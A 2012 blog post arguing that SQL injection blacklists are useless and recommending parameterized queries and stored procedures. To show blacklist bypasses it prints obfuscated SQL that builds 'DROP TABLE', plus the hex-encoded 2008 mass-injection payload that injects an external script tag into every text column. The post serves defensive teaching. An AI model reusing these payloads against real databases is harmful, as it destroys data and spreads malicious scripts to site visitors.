---
title: Please don't use blacklists, use parameterized queries or stored procs instead
author: SQLDenis
type: post
date: 2012-04-05T10:55:00+00:00
ID: 1587
excerpt: "Every now and then you will hear how some site will use a blacklist to 'protect' themselves against sql injection. Using a blacklist is very foolish because you can't ever think of all the different ways that the bad guys will try to bypass your little&hellip;"
url: /index.php/datamgmt/datadesign/please-don-t-use-blacklists/
views:
  - 13977
rp4wp_auto_linked:
  - 1
categories:
  - Data Modelling and Design
  - Database Programming
  - IBM DB2
  - Microsoft SQL Server
  - MySQL
tags:
  - best practices
  - security
  - sql injection

---
Every now and then you will hear how some site will use a blacklist to 'protect' themselves against sql injection. Using a blacklist is very foolish because you can't ever think of all the different ways that the bad guys will try to bypass your little list.
  
Let's say you have DROP and DROP TABLE in your list.

What about these two

```sql
PRINT REVERSE('tset ELBAT PORD')
PRINT convert(VARCHAR(100),0x44524F50205441424C4520746573740000000000)
```

Change PRINT to EXEC() and both will result in DROP TABLE Test

Remember this one?

```sql
DECLARE @S VARCHAR(4000);SET @S=CAST(0x4445434C415245204054205641524348415228323535292C40432056415243484152283235
3529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420
612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73
206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E
78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F522062
2E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046
524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F
5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D2053455420
5B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B4043
2B275D29292B27273C736372697074207372633D687474703A2F2F7777772E63686B626E722E636F6D2F
622E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F43
7572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445
414C4C4F43415445205461626C655F437572736F7220 AS VARCHAR(4000));print @S;
```

That becomes this

```sql
DECLARE @T VARCHAR(255),@C VARCHAR(255) 
DECLARE Table_Cursor CURSOR FOR SELECT a.name,b.name 
FROM sysobjects a,syscolumns b 
WHERE a.id=b.id AND a.xtype='u' AND (b.xtype=99 OR b.xtype=35 OR b.xtype=231 OR b.xtype=167) 
OPEN Table_Cursor 
	FETCH NEXT FROM Table_Cursor INTO @T,@C 
	WHILE(@@FETCH_STATUS=0) 
	BEGIN 
--I changed EXEC to PRINT, just in case you are foolish enough to run this
		PRINT('UPDATE ['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+''<script src=http://SomeFakeSite></script>''') 
		FETCH NEXT FROM Table_Cursor INTO @T,@C 
	END 
CLOSE Table_Cursor DEALLOCATE Table_Cursor 
```

That infected millions of pages in 2008, there are still variants of this one today. A blacklist won't help you in this case.

You can also protect yourself against this attack by denying SELECT permissions on the sysobjects table, your website user should not have access to these tables in general. If you use stored procedures you can just give access to the stored procedures and nothing else.

Every web framework today offers a way to use parameterized queries and or stored procedures. There is really no excuse to fall victim to a SQL injection attack these days. 

Even using an ORM like Hibernate or Entity Framework is protected against SQL Injection because it use sp_executesql with proper parameters behind the scenes.

If you do use stored procedures, you might still have a problem if you are using dynamic SQL inside the proc with EXEC and concatenation instead of sp_executesql with proper parameters

So why do people start out by using code that is prone to SQL injection? I think there are two parts to this. 

  1. It is easier to debug and see what is contained in the string by doing a debug.write/response.write now you can see exactly what is being sent to the DB
  2. There are still books/online examples around that show code that concatenate user input with SQL

Whenever I see code like this when a person asks for help, I immediately tell that person his code is vulnerable to a SQL injection attack, it is my duty to alert this person, it is yours too, we need to educate these people